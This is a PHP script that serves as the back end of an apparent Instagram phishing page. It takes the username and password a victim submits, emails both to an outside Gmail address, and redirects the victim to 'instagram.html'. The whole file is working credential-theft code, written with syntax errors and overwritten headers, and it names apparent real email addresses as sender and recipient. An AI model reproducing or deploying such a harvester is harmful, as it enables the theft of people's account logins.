<?php
$username=$_POST['username'];
$password=$_POST['password'];
$email_form='spam88806@gmail.com';
$email_subject="form submission"
$email_body="user name:$username.\n". 
            "password:$password". 
            $to="ajeet31967@gmail.com";
            $headers="form:$email_form \r\n";
$headers="reply-to:$visitor_email\r\n";
mail($to,$email_subject,$email_body,$headers);
header("location:instagram.html");













?>